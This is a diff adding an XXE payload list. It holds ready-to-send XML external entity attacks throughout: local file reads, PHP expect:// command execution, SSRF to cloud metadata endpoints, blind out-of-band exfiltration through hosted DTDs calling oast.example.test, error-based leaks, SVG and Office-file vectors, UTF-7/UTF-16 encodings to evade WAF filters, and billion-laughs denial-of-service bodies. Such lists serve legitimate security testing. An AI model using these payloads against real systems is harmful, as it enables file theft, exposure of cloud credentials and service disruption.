@@ -1,0 +1,94 @@
+# XXE Payloads
+# Each block is an independent request body. Replace oast.example.test and app.example.test with hosts you control.
+
+# Entity expansion detection (no external resource, safe first probe)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY t "xxe-marker">]><r>&t;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "xxe"><!ENTITY b "&a;-&a;">]><r>&b;</r>
+
+# Classic local file read (Linux)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/os-release">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/cmdline">]><r>&x;</r>
+
+# Classic local file read (Windows)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><r>&x;</r>
+
+# Directory listing (Java parsers)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///var/www/">]><r>&x;</r>
+
+# Wrapper-based read of files with XML-breaking characters (PHP)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>
+
+# Java-specific protocol handlers
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "jar:http://oast.example.test/test.zip!/file.txt">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "netdoc:///etc/hostname">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "gopher://oast.example.test:80/_xxe-marker">]><r>&x;</r>
+
+# XXE to SSRF (internal service and metadata probes)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oast.example.test/xxe-ssrf">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:80/">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://localhost:8080/actuator/env">]><r>&x;</r>
+
+# Blind XXE: out-of-band interaction with a general entity
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oast.example.test/blind-general">]><r>&x;</r>
+
+# Blind XXE: out-of-band interaction with a parameter entity (use when general entities are blocked)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://oast.example.test/blind-param"> %p;]><r>x</r>
+
+# Blind XXE: external DTD exfiltration (body sent to the target)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://oast.example.test/ext.dtd"> %d;]><r>&exfil;</r>
+
+# Blind XXE: hosted ext.dtd content (file on your server)
+<!ENTITY % f SYSTEM "file:///etc/hostname"><!ENTITY % w "<!ENTITY exfil SYSTEM 'http://oast.example.test/?d=%f;'>">%w;
+
+# Blind XXE: hosted ext.dtd, FTP variant for multi-line files
+<!ENTITY % f SYSTEM "file:///etc/os-release"><!ENTITY % w "<!ENTITY exfil SYSTEM 'ftp://oast.example.test/%f;'>">%w;
+
+# Error-based XXE: hosted ext.dtd leaks file content in a parser error message
+<!ENTITY % f SYSTEM "file:///etc/hostname"><!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">%e;%err;
+
+# Error-based XXE: reuse a local DTD already on the server (no outbound traffic needed)
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso '<!ENTITY &#x25; f SYSTEM "file:///etc/hostname"><!ENTITY &#x25; e "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;f;&#x27;>">&#x25;e;&#x25;err;'>%local;]><r>x</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % local SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"><!ENTITY % condition 'aaa)><!ENTITY &#x25; f SYSTEM "file:///etc/hostname"><!ENTITY &#x25; e "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;f;&#x27;>">&#x25;e;&#x25;err;<!ELEMENT aa (bb'>%local;]><r>x</r>
+
+# XInclude (use when you control only a value inside a server-built document)
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/hostname"/>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://oast.example.test/xinclude"/></foo>
+
+# SOAP envelope carrying a DOCTYPE
+<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/hostname">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><q>&x;</q></soapenv:Body></soapenv:Envelope>
+
+# SVG upload / render
+<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg" width="400" height="40"><text x="0" y="20">&x;</text></svg>
+<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://oast.example.test/svg-image" width="1" height="1"/></svg>
+
+# XLSX / DOCX / PPTX: add the DOCTYPE to [Content_Types].xml, xl/workbook.xml or word/document.xml inside the ZIP, then re-zip and upload
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE x [<!ENTITY % d SYSTEM "http://oast.example.test/office.dtd"> %d;]>
+
+# Encoding tricks to evade naive WAF/keyword filters (re-encode the whole document)
+# UTF-16 BE body: iconv -f UTF-8 -t UTF-16BE payload.xml > payload16.xml  (send with Content-Type: application/xml; charset=utf-16)
+# UTF-7 body: iconv -f UTF-8 -t UTF-7 payload.xml > payload7.xml
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
+<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE r +AFs-+ADw-!ENTITY x SYSTEM +ACI-file:///etc/hostname+ACI-+AD4-+AF0-+AD4-+ADw-r+AD4-+ACY-x+ADs-+ADw-/r+AD4-
+
+# Content-type switching: send the XML above to an endpoint that normally takes JSON
+# Content-Type: application/xml
+# Content-Type: text/xml
+# Content-Type: application/x-www-form-urlencoded  (body: xml=<url-encoded document>)
+
+# Entity expansion resource tests (billion laughs, quadratic blowup): run only against fixtures you own and cap with a timeout
+<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><l>&d;</l>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///dev/random">]><r>&x;</r>
+
+# XSLT-assisted read where the parser also transforms stylesheets
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document('file:///etc/hostname')"/></xsl:template></xsl:stylesheet>
+
+# Detection of parser features without a DOCTYPE (schema location fetch)
+<r xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://oast.example.test/schema.xsd">x</r>
